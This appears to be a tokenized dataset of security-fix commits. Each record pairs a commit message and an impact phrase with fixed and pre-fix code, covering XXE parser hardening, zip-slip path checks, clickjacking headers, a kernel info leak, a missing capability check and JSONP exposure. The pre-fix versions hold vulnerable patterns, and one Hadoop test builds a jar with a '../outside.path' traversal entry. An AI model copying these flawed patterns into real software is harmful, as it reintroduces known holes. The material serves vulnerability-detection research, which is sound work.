{"contents": ["Create", "safe", "xml", "parsers"], "code_tokens": ["import", "org", ".", "xml", ".", "sax", ".", "SAXNotRecognizedException", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXNotSupportedException", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "private", "XMLTypeValidator", "(", "Validator", "schemaValidator", ")", "throws", "SAXNotRecognizedException", ",", "SAXNotSupportedException", "{", "/", "/", "protect", "this", "validator", "against", "XXE", "this", ".", "schemaValidator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "this", ".", "schemaValidator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "\")", ";", "DocumentBuilder", "parser", "=", "createDocumentBuilderFactoryInstance", "(", ").", "newDocumentBuilder", "(", ");", "/", "/", "create", "a", "SchemaFactory", "capable", "of", "understanding", "WXS", "schemas", "SchemaFactory", "factory", "=", "createSchemaFactoryInstance", "(", ");", "/", "/", "load", "a", "WXS", "schema", ",", "represented", "by", "a", "Schema", "instance", "Source", "xmlSchemaSource", "=", "new", "StreamSource", "(", "new", "StringReader", "(", "xmlSchema", ")", ");", "/", "**", "*", "Safely", "create", "a", "DocumentBuilderFactory", "following", "OWASP", "best", "practises", "*", "@", "return", "DocumentBuilderFactory", "instance", "*", "/", "private", "static", "DocumentBuilderFactory", "createDocumentBuilderFactoryInstance", "(", ")", "throws", "ParserConfigurationException", "{", "final", "DocumentBuilderFactory", "dbf", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "String", "FEATURE", ";", "System", ".", "out", ".", "println", "(", "\">", ">>", ">\"", "+", "dbf", ".", "getFeature", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "disallow", "-", "doctype", "-", "decl", "\"", "))", ";", "/", "/", "This", "is", "the", "PRIMARY", "defense", ".", "If", "DTDs", "(", "doctypes", ")", "are", "disallowed", ",", "almost", "all", "XML", "entity", "attacks", "are", "prevented", "/", "/", "Xerces", "2", "only", "-", "http", ":", "//", "xerces", ".", "apache", ".", "org", "/", "xerces2", "-", "j", "/", "features", ".", "html", "#", "disallow", "-", "doctype", "-", "decl", "FEATURE", "=", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "disallow", "-", "doctype", "-", "decl", "\"", ";", "dbf", ".", "setFeature", "(", "FEATURE", ",", "true", ")", ";", "/", "/", "If", "you", "can", "'", "t", "completely", "disable", "DTDs", ",", "then", "at", "least", "do", "the", "following", ":", "/", "/", "Xerces", "1", "-", "http", ":", "//", "xerces", ".", "apache", ".", "org", "/", "xerces", "-", "j", "/", "features", ".", "html", "#", "external", "-", "general", "-", "entities", "/", "/", "Xerces", "2", "-", "http", ":", "//", "xerces", ".", "apache", ".", "org", "/", "xerces2", "-", "j", "/", "features", ".", "html", "#", "external", "-", "general", "-", "entities", "/", "/", "JDK7", "+", "-", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "FEATURE", "=", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ";", "dbf", ".", "setFeature", "(", "FEATURE", ",", "false", ")", ";", "/", "/", "Xerces", "1", "-", "http", ":", "//", "xerces", ".", "apache", ".", "org", "/", "xerces", "-", "j", "/", "features", ".", "html", "#", "external", "-", "parameter", "-", "entities", "/", "/", "Xerces", "2", "-", "http", ":", "//", "xerces", ".", "apache", ".", "org", "/", "xerces2", "-", "j", "/", "features", ".", "html", "#", "external", "-", "parameter", "-", "entities", "/", "/", "JDK7", "+", "-", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "FEATURE", "=", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "\"", ";", "dbf", ".", "setFeature", "(", "FEATURE", ",", "false", ")", ";", "/", "/", "Disable", "external", "DTDs", "as", "well", "FEATURE", "=", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "nonvalidating", "/", "load", "-", "external", "-", "dtd", "\"", ";", "dbf", ".", "setFeature", "(", "FEATURE", ",", "false", ")", ";", "/", "/", "and", "these", "as", "well", ",", "per", "Timothy", "Morgan", "'", "s", "2014", "paper", ":", "\"", "XML", "Schema", ",", "DTD", ",", "and", "Entity", "Attacks", "\"", "dbf", ".", "setXIncludeAware", "(", "false", ")", ";", "dbf", ".", "setExpandEntityReferences", "(", "false", ")", ";", "/", "/", "And", ",", "per", "Timothy", "Morgan", ":", "\"", "If", "for", "some", "reason", "support", "for", "inline", "DOCTYPEs", "are", "a", "requirement", ",", "then", "/", "/", "ensure", "the", "entity", "settings", "are", "disabled", "(", "as", "shown", "above", ")", "and", "beware", "that", "SSRF", "attacks", "/", "/", "(", "http", ":", "//", "cwe", ".", "mitre", ".", "org", "/", "data", "/", "definitions", "/", "918", ".", "html", ")", "and", "denial", "/", "/", "of", "service", "attacks", "(", "such", "as", "billion", "laughs", "or", "decompression", "bombs", "via", "\"", "jar", ":", "\")", "are", "a", "risk", ".", "\"", "return", "dbf", ";", "}", "/", "**", "*", "Creates", "a", "SchemaFactory", "instance", "following", "OWASP", "best", "practices", "*", "@", "return", "SchemaFactory", "instance", "*", "/", "private", "static", "SchemaFactory", "createSchemaFactoryInstance", "(", ")", "throws", "SAXNotRecognizedException", ",", "SAXNotSupportedException", "{", "final", "SchemaFactory", "factory", "=", "SchemaFactory", ".", "newInstance", "(", "XMLConstants", ".", "W3C_XML_SCHEMA_NS_URI", ")", ";", "factory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "factory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "\")", ";", "return", "factory", ";", "}</s>private", "XMLTypeValidator", "(", "Validator", "schemaValidator", ")", "{", "DocumentBuilder", "parser", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ").", "newDocumentBuilder", "(", ");", "/", "/", "create", "a", "SchemaFactory", "capable", "of", "understanding", "WXS", "schemas", "SchemaFactory", "factory", "=", "SchemaFactory", ".", "newInstance", "(", "XMLConstants", ".", "W3C_XML_SCHEMA_NS_URI", ")", ";", "/", "/", "load", "a", "WXS", "schema", ",", "represented", "by", "a", "Schema", "instance", "Source", "xmlSchemaSource", "=", "new", "StreamSource", "(", "new", "StringReader", "(", "xmlSchema", ")", ");"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["Additional", "check", "when", "unpacking", "archives.", "Contributed", "by", "Wilfred", "Spiegelenburg."], "code_tokens": ["String", "targetDirPath", "=", "toDir", ".", "getCanonicalPath", "(", ")", "+", "File", ".", "separator", ";", "if", "(", "!", "file", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "targetDirPath", ")", ")", "{", "throw", "new", "IOException", "(", "\"", "expanding", "\"", "+", "entry", ".", "getName", "(", ")", "+", "\"", "would", "create", "file", "outside", "of", "\"", "+", "toDir", ")", ";", "}", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "java", ".", "util", ".", "jar", ".", "JarEntry", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "test", ".", "GenericTestUtils", ";", "@", "Test", "public", "void", "testUnJar2", "(", ")", "throws", "IOException", "{", "/", "/", "make", "a", "simple", "zip", "File", "jarFile", "=", "new", "File", "(", "TEST_ROOT_DIR", ",", "TEST_JAR_NAME", ")", ";", "JarOutputStream", "jstream", "=", "new", "JarOutputStream", "(", "new", "FileOutputStream", "(", "jarFile", ")", ");", "JarEntry", "je", "=", "new", "JarEntry", "(", "\"", "META", "-", "INF", "/", "MANIFEST", ".", "MF", "\"", ");", "byte", "[", "]", "data", "=", "\"", "Manifest", "-", "Version", ":", "1", ".", "0", "\\", "nCreated", "-", "By", ":", "1", ".", "8", ".", "0_1", "(", "Manual", ")", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "je", ".", "setSize", "(", "data", ".", "length", ")", ";", "jstream", ".", "putNextEntry", "(", "je", ")", ";", "jstream", ".", "write", "(", "data", ")", ";", "jstream", ".", "closeEntry", "(", ");", "je", "=", "new", "JarEntry", "(", "\".", "./", "outside", ".", "path", "\"", ");", "data", "=", "\"", "any", "data", "here", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "je", ".", "setSize", "(", "data", ".", "length", ")", ";", "jstream", ".", "putNextEntry", "(", "je", ")", ";", "jstream", ".", "write", "(", "data", ")", ";", "jstream", ".", "closeEntry", "(", ");", "jstream", ".", "close", "(", ");", "File", "unjarDir", "=", "new", "File", "(", "TEST_ROOT_DIR", ",", "\"", "unjar", "-", "path", "\"", ");", "/", "/", "Unjar", "everything", "try", "{", "RunJar", ".", "unJar", "(", "jarFile", ",", "unjarDir", ")", ";", "fail", "(", "\"", "unJar", "should", "throw", "IOException", ".", "\")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "GenericTestUtils", ".", "assertExceptionContains", "(", "\"", "would", "create", "file", "outside", "of", "\"", ",", "e", ")", ";", "}", "}", "}</s>}"], "docstring_tokens": ["write", "to", "arbitrary", "files", "on", "the", "system"]}
{"contents": ["https://issues.apache.org/jira/browse/AMQ-6170", "Fixing", "X-Frame-Options", "header", "so", "that", "is", "applied", "for", "all", "content", "served", "by", "Jetty.", "The", "previous", "patch", "wasn't", "correct", "because", "it", "only", "applied", "it", "to", "Servlets", "and", "JSPs", "and", "not", "static", "content.", "This", "also", "reverts", "AMQ-6113"], "code_tokens": ["<", "bean", "id", "=", "\"", "rewriteHandler", "\"", "class", "=", "\"", "org", ".", "eclipse", ".", "jetty", ".", "rewrite", ".", "handler", ".", "RewriteHandler", "\"", ">", "<", "property", "name", "=", "\"", "rules", "\"", ">", "<", "list", ">", "<", "bean", "id", "=", "\"", "header", "\"", "class", "=", "\"", "org", ".", "eclipse", ".", "jetty", ".", "rewrite", ".", "handler", ".", "HeaderPatternRule", "\"", ">", "<", "property", "name", "=", "\"", "pattern", "\"", "value", "=", "\"*", "\"/", ">", "<", "property", "name", "=", "\"", "name", "\"", "value", "=", "\"", "X", "-", "FRAME", "-", "OPTIONS", "\"", "/>", "<", "property", "name", "=", "\"", "value", "\"", "value", "=", "\"", "SAMEORIGIN", "\"", "/>", "<", "/", "bean", ">", "<", "/", "list", ">", "<", "/", "property", ">", "<", "/", "bean", ">", "<", "ref", "bean", "=", "\"", "rewriteHandler", "\"", "/>", "<", "bean", "id", "=", "\"", "rewriteHandler", "\"", "class", "=", "\"", "org", ".", "eclipse", ".", "jetty", ".", "rewrite", ".", "handler", ".", "RewriteHandler", "\"", ">", "<", "property", "name", "=", "\"", "rules", "\"", ">", "<", "list", ">", "<", "bean", "id", "=", "\"", "header", "\"", "class", "=", "\"", "org", ".", "eclipse", ".", "jetty", ".", "rewrite", ".", "handler", ".", "HeaderPatternRule", "\"", ">", "<", "property", "name", "=", "\"", "pattern", "\"", "value", "=", "\"*", "\"/", ">", "<", "property", "name", "=", "\"", "name", "\"", "value", "=", "\"", "X", "-", "FRAME", "-", "OPTIONS", "\"", "/>", "<", "property", "name", "=", "\"", "value", "\"", "value", "=", "\"", "SAMEORIGIN", "\"", "/>", "<", "/", "bean", ">", "<", "/", "list", ">", "<", "/", "property", ">", "<", "/", "bean", ">", "<", "ref", "bean", "=", "\"", "rewriteHandler", "\"", "/></s><", "filter", ">", "<", "filter", "-", "name", ">", "XFrameOptions", "<", "/", "filter", "-", "name", ">", "<", "filter", "-", "class", ">", "org", ".", "apache", ".", "activemq", ".", "web", ".", "XFrameOptionsFilter", "<", "/", "filter", "-", "class", ">", "<", "/", "filter", ">", "<", "filter", "-", "mapping", ">", "<", "filter", "-", "name", ">", "XFrameOptions", "<", "/", "filter", "-", "name", ">", "<", "url", "-", "pattern", ">", "/*", "</", "url", "-", "pattern", ">", "<", "/", "filter", "-", "mapping", ">", "<", "filter", ">", "<", "filter", "-", "name", ">", "XFrameOptions", "<", "/", "filter", "-", "name", ">", "<", "filter", "-", "class", ">", "org", ".", "apache", ".", "activemq", ".", "web", ".", "XFrameOptionsFilter", "<", "/", "filter", "-", "class", ">", "<", "/", "filter", ">", "<", "filter", "-", "mapping", ">", "<", "filter", "-", "name", ">", "XFrameOptions", "<", "/", "filter", "-", "name", ">", "<", "url", "-", "pattern", ">", "/*", "</", "url", "-", "pattern", ">", "<", "/", "filter", "-", "mapping", ">", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "web", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "javax", ".", "servlet", ".", "Filter", ";", "import", "javax", ".", "servlet", ".", "FilterChain", ";", "import", "javax", ".", "servlet", ".", "FilterConfig", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "import", "javax", ".", "servlet", ".", "ServletRequest", ";", "import", "javax", ".", "servlet", ".", "ServletResponse", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "/", "**", "*", "Filter", "to", "set", "the", "header", "X", "-", "FRAME", "-", "OPTIONS", "on", "web", "responses", "*", "*", "/", "public", "class", "XFrameOptionsFilter", "implements", "Filter", "{", "private", "static", "String", "SAMEORIGIN", "=", "\"", "SAMEORIGIN", "\"", ";", "@", "Override", "public", "void", "init", "(", "FilterConfig", "config", ")", "throws", "ServletException", "{", "}", "@", "Override", "public", "void", "doFilter", "(", "ServletRequest", "request", ",", "ServletResponse", "response", ",", "FilterChain", "chain", ")", "throws", "IOException", ",", "ServletException", "{", "HttpServletResponse", "servletResponse", "=", "(", "HttpServletResponse", ")", "response", ";", "/", "/", "Set", "all", "responses", "to", "SAMEORIGIN", ",", "can", "be", "switched", "to", "be", "configurable", "later", "if", "/", "/", "we", "need", "to", "conditionally", "set", "this", "servletResponse", ".", "addHeader", "(", "\"", "X", "-", "FRAME", "-", "OPTIONS", "\"", ",", "SAMEORIGIN", ")", ";", "chain", ".", "doFilter", "(", "request", ",", "response", ")", ";", "}", "@", "Override", "public", "void", "destroy", "(", ")", "{", "}", "}", "@", "@", "-", "46", ",", "9", "+", "46", ",", "22", "@", "@"], "docstring_tokens": ["jack", "the", "victim's", "click", "actions"]}
{"contents": ["Add", "some", "sanity", "checks", "when", "checking", "CRL", "scores", "Note:", "this", "was", "accidentally", "omitted", "from", "OpenSSL", "1.0.2", "branch.", "Without", "this", "fix", "any", "attempt", "to", "use", "CRLs", "will", "crash.", "Thanks", "to", "Bruce", "Stephens", "and", "Thomas", "Jakobi", "for", "reporting", "this", "issue.", "Reviewed-by:", "Stephen", "Henson", "<steve@openssl.org>", "Reviewed-by:", "Rich", "Salz", "<rsalz@openssl.org>"], "code_tokens": ["if", "(", "crl_score", "<", "best_score", "|", "|", "crl_score", "=", "=", "0", ")", "if", "(", "crl_score", "=", "=", "best_score", "&", "&", "best_crl", "!", "=", "NULL", ")", "{</s>if", "(", "crl_score", "<", "best_score", ")", "if", "(", "crl_score", "=", "=", "best_score", ")", "{"], "docstring_tokens": ["the", "application", "to", "crash"]}
{"contents": ["netfilter:", "ebtables:", "enforce", "CAP_NET_ADMIN", "normal", "users", "are", "currently", "allowed", "to", "set/modify", "ebtables", "rules.", "Restrict", "it", "to", "processes", "with", "CAP_NET_ADMIN.", "Note", "that", "this", "cannot", "be", "reproduced", "with", "unmodified", "ebtables", "binary", "because", "it", "uses", "SOCK_RAW.", "Signed-off-by:", "Florian", "Westphal", "<fwestphal@astaro.com>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Patrick", "McHardy", "<kaber@trash.net>"], "code_tokens": ["if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";</s>"], "docstring_tokens": ["bypass", "intended", "access", "restrictions", "and", "configure", "arbitrary", "network-traffic", "filtering"]}
{"contents": ["Bluetooth:", "RFCOMM", "-", "Fix", "info", "leak", "in", "getsockopt(BT_SECURITY)", "The", "RFCOMM", "code", "fails", "to", "initialize", "the", "key_size", "member", "of", "struct", "bt_security", "before", "copying", "it", "to", "userland", "--", "that", "for", "leaking", "one", "byte", "kernel", "stack.", "Initialize", "key_size", "with", "0", "to", "avoid", "the", "info", "leak.", "Signed-off-by:", "Mathias", "Krause", "<minipli@googlemail.com>", "Cc:", "Marcel", "Holtmann", "<marcel@holtmann.org>", "Cc:", "Gustavo", "Padovan", "<gustavo@padovan.org>", "Cc:", "Johan", "Hedberg", "<johan.hedberg@gmail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["sec", ".", "key_size", "=", "0", ";</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "memory"]}
{"contents": ["[RESTEASY-1486]", "Jackson2JsonInterceptor", "needs", "to", "be", "enabled", "by", "setting", "a", "web", "context", "parameter", "to", "\"true\"."], "code_tokens": ["<", "para", ">", "<", "emphasis", "role", "=", "\"", "bold", "\"", ">", "Note", ".", "</", "emphasis", ">", "Because", "JSONP", "can", "be", "used", "in", "<", "emphasis", "role", "=", "\"", "bold", "\"", ">", "Cross", "Site", "Scripting", "Inclusion", "(", "XSSI", ")", "attacks", "<", "/", "emphasis", ">", ",", "<", "methodname", ">", "Jackson2JsonpInterceptor", "<", "/", "methodname", ">", "is", "disabled", "by", "default", ".", "Two", "steps", "are", "necessary", "to", "enable", "it", ":", "<", "/", "para", ">", "<", "orderedlist", ">", "<", "listitem", ">", "As", "noted", "above", ",", "<", "methodname", ">", "Jackson2JsonpInterceptor", "<", "/", "methodname", ">", "must", "be", "included", "in", "the", "deployment", ".", "For", "example", ",", "a", "service", "file", "META", "-", "INF", "/", "services", "/", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "with", "the", "line", "<", "programlisting", ">", "org", ".", "jboss", ".", "resteasy", ".", "plugins", ".", "providers", ".", "jackson", ".", "Jackson2JsonpInterceptor", "<", "/", "programlisting", ">", "may", "be", "included", "on", "the", "classpath", "<", "/", "listitem", ">", "<", "listitem", ">", "Also", ",", "the", "servlet", "context", "parameter", "parameter", "\"", "resteasy", ".", "jsonp", ".", "enable", "\"", "must", "be", "set", "to", "\"", "true", "\"", ".", "<", "/", "listitem", ">", "<", "/", "orderedlist", ">", "enabled", "=", "Boolean", ".", "parseBoolean", "(", "context", ".", "getParameter", "(", "\"", "resteasy", ".", "jsonp", ".", "enable", "\"", "))", ";", "/", "**", "*", "Is", "this", "interceptor", "enabled", ".", "*", "/", "private", "boolean", "enabled", "=", "false", ";", "if", "(", "enabled", "&", "&", "function", "!", "=", "null", "&", "&", "!", "function", ".", "trim", "(", ").", "isEmpty", "(", ")", "&", "&", "!", "jsonpCompatibleMediaTypes", ".", "getPossible", "(", "context", ".", "getMediaType", "(", "))", ".", "isEmpty", "(", "))", "{", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "private", "static", "final", "String", "JSONP_ENABLED", "=", "\"", "JSONP_enabled", "\"", ";", "private", "static", "final", "String", "JSONP_DISABLED", "=", "\"", "JSONP_disabled", "\"", ";", "war", ".", "addAsResource", "(", "Jackson2Test", ".", "class", ".", "getPackage", "(", "),", "\"", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ",", "\"", "META", "-", "INF", "/", "services", "/", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ");", "@", "Deployment", "(", "name", "=", "\"", "JSONPenabled", "\"", ")", "public", "static", "Archive", "<", "?>", "deployJSONPenabled", "(", ")", "{", "WebArchive", "war", "=", "TestUtil", ".", "prepareArchive", "(", "JSONP_ENABLED", ")", ";", "war", ".", "addClass", "(", "Jackson2Test", ".", "class", ")", ";", "war", ".", "addAsResource", "(", "Jackson2Test", ".", "class", ".", "getPackage", "(", "),", "\"", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ",", "\"", "META", "-", "INF", "/", "services", "/", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ");", "Map", "<", "String", ",", "String", ">", "contextParam", "=", "new", "HashMap", "<", ">(", ");", "contextParam", ".", "put", "(", "\"", "resteasy", ".", "jsonp", ".", "enable", "\"", ",", "\"", "true", "\"", ");", "return", "TestUtil", ".", "finishContainerPrepare", "(", "war", ",", "contextParam", ",", "Jackson2Resource", ".", "class", ",", "Jackson2Product", ".", "class", ",", "Jackson2XmlResource", ".", "class", ",", "Jackson2XmlProduct", ".", "class", ",", "Jackson2JAXBResource", ".", "class", ",", "Jackson2XmlResourceWithJacksonAnnotation", ".", "class", ",", "Jackson2XmlResourceWithJAXB", ".", "class", ")", ";", "}", "@", "Deployment", "(", "name", "=", "\"", "JSONPdisabled", "\"", ")", "public", "static", "Archive", "<", "?>", "deployJSONPdisabled", "(", ")", "{", "WebArchive", "war", "=", "TestUtil", ".", "prepareArchive", "(", "JSONP_DISABLED", ")", ";", "war", ".", "addClass", "(", "Jackson2Test", ".", "class", ")", ";", "war", ".", "addAsResource", "(", "Jackson2Test", ".", "class", ".", "getPackage", "(", "),", "\"", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ",", "\"", "META", "-", "INF", "/", "services", "/", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ");", "Map", "<", "String", ",", "String", ">", "contextParam", "=", "new", "HashMap", "<", ">(", ");", "contextParam", ".", "put", "(", "\"", "resteasy", ".", "jsonp", ".", "enable", "\"", ",", "\"", "false", "\"", ");", "return", "TestUtil", ".", "finishContainerPrepare", "(", "war", ",", "contextParam", ",", "Jackson2Resource", ".", "class", ",", "Jackson2Product", ".", "class", ",", "Jackson2XmlResource", ".", "class", ",", "Jackson2XmlProduct", ".", "class", ",", "Jackson2JAXBResource", ".", "class", ",", "Jackson2XmlResourceWithJacksonAnnotation", ".", "class", ",", "Jackson2XmlResourceWithJAXB", ".", "class", ")", ";", "}", "Jackson2XmlResourceWithJacksonAnnotation", ".", "class", ",", "Jackson2XmlResourceWithJAXB", ".", "class", ",", "org", ".", "jboss", ".", "resteasy", ".", "plugins", ".", "providers", ".", "jackson", ".", "Jackson2JsonpInterceptor", ".", "class", ")", ";", "*", "@", "tpPassCrit", "The", "resource", "returns", "json", "entities", "in", "correct", "format", "(", "with", "callback", "function", "wrapping", ")", "*", "@", "tpSince", "RESTEasy", "3", ".", "0", ".", "16", "as", "testJacksonJsonp", "(", ")", "(", "but", "Jackson2JsonpInterceptor", "didn", "'", "t", "need", "to", "be", "enabled", ")", "public", "void", "testJacksonJsonpEnabled", "(", ")", "throws", "Exception", "{", "WebTarget", "target", "=", "client", ".", "target", "(", "PortProviderUtil", ".", "generateURL", "(", "\"/", "products", "/", "333", "?", "callback", "=", "foo", "\"", ",", "JSONP_ENABLED", ")", ");", "/", "**", "*", "@", "tpTestDetails", "Client", "sends", "GET", "request", "for", "Json", "resource", ".", "The", "request", "url", "contains", "'", "callback", "'", "keyword", "which", "should", "*", "trigger", "processing", "of", "the", "response", "in", "the", "format", "callbackvalue", "(", "\"", "key", "\"", ":\"", "value", "\"", ").", "However", ",", "Jackson2JsonpInterceptor", "is", "disabled", ".", "*", "@", "tpPassCrit", "The", "resource", "returns", "json", "entities", "in", "correct", "format", "(", "without", "callback", "function", "wrapping", ")", "*", "@", "tpSince", "RESTEasy", "3", ".", "1", ".", "0", ".", "Final", "*", "/", "@", "Test", "public", "void", "testJacksonJsonpDisabled", "(", ")", "throws", "Exception", "{", "WebTarget", "target", "=", "client", ".", "target", "(", "PortProviderUtil", ".", "generateURL", "(", "\"/", "products", "/", "333", "?", "callback", "=", "foo", "\"", ",", "JSONP_DISABLED", ")", ");", "Response", "response", "=", "target", ".", "request", "(", ").", "get", "(", ");", "String", "entity", "=", "response", ".", "readEntity", "(", "String", ".", "class", ")", ";", "logger", ".", "info", "(", "entity", ")", ";", "Assert", ".", "assertEquals", "(", "HttpResponseCodes", ".", "SC_OK", ",", "response", ".", "getStatus", "(", "))", ";", "Assert", ".", "assertEquals", "(", "\"", "Jackson2JsonpInterceptor", "should", "be", "disabled", "\"", ",", "\"", "{\\", "\"", "name", "\\", "\":", "\\\"", "Iphone", "\\", "\",", "\\\"", "id", "\\", "\":", "333", "}", "\",", "entity", ")", ";", "response", ".", "close", "(", ");", "}", "/", "**", "*", "@", "tpTestDetails", "Client", "sends", "GET", "request", "for", "Json", "resource", ".", "The", "request", "url", "contains", "'", "callback", "'", "keyword", "which", "should", "*", "trigger", "processing", "of", "the", "response", "in", "the", "format", "callbackvalue", "(", "\"", "key", "\"", ":\"", "value", "\"", ")", "*", "@", "tpPassCrit", "The", "resource", "returns", "json", "entities", "in", "correct", "format", "(", "without", "callback", "function", "wrapping", ")", "*", "@", "tpInfo", "This", "test", "fails", ",", "see", "RESTEASY", "-", "1168", ".", "This", "should", "be", "fixed", "in", "3", ".", "0", ".", "12", "release", ".", "*", "@", "tpSince", "RESTEasy", "3", ".", "0", ".", "16", "(", "as", "testJacksonJsonp", "(", ")", "but", "Jackson2JsonpInterceptor", "would", "have", "been", "enabled", ")", "*", "/", "@", "Test", "public", "void", "testJacksonJsonpDefault", "(", ")", "throws", "Exception", "{", "WebTarget", "target", "=", "client", ".", "target", "(", "generateURL", "(", "\"/", "products", "/", "333", "?", "callback", "=", "foo", "\"", "))", ";", "Response", "response", "=", "target", ".", "request", "(", ").", "get", "(", ");", "String", "entity", "=", "response", ".", "readEntity", "(", "String", ".", "class", ")", ";", "logger", ".", "info", "(", "entity", ")", ";", "Assert", ".", "assertEquals", "(", "HttpResponseCodes", ".", "SC_OK", ",", "response", ".", "getStatus", "(", "))", ";", "Assert", ".", "assertEquals", "(", "\"", "Jackson2JsonpInterceptor", "should", "be", "disabled", "\"", ",", "\"", "{\\", "\"", "name", "\\", "\":", "\\\"", "Iphone", "\\", "\",", "\\\"", "id", "\\", "\":", "333", "}", "\",", "entity", ")", ";", "response", ".", "close", "(", ");", "}</s>if", "(", "function", "!", "=", "null", "&", "&", "!", "function", ".", "trim", "(", ").", "isEmpty", "(", ")", "&", "&", "!", "jsonpCompatibleMediaTypes", ".", "getPossible", "(", "context", ".", "getMediaType", "(", "))", ".", "isEmpty", "(", "))", "{", "war", ".", "addAsResource", "(", "Jackson2Test", ".", "class", ".", "getPackage", "(", "),", "\"", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ",", "\"", "META", "-", "INF", "/", "services", "/", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "Providers", "\"", ");", "Jackson2XmlResourceWithJacksonAnnotation", ".", "class", ",", "Jackson2XmlResourceWithJAXB", ".", "class", ")", ";", "*", "@", "tpPassCrit", "The", "resource", "returns", "json", "entities", "in", "correct", "format", "*", "@", "tpSince", "RESTEasy", "3", ".", "0", ".", "16", "public", "void", "testJacksonJsonp", "(", ")", "throws", "Exception", "{", "WebTarget", "target", "=", "client", ".", "target", "(", "generateURL", "(", "\"/", "products", "/", "333", "?", "callback", "=", "foo", "\"", "))", ";"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["fix", "readUE7"], "code_tokens": ["if", "(", "i", "<", "0", ")", "{", "throw", "new", "IOException", "(", "\"", "Buffer", "underun", ";", "expected", "one", "more", "byte", "\"", ");", "}</s>"], "docstring_tokens": ["execute", "arbitrary", "commands", "on", "the", "system"]}
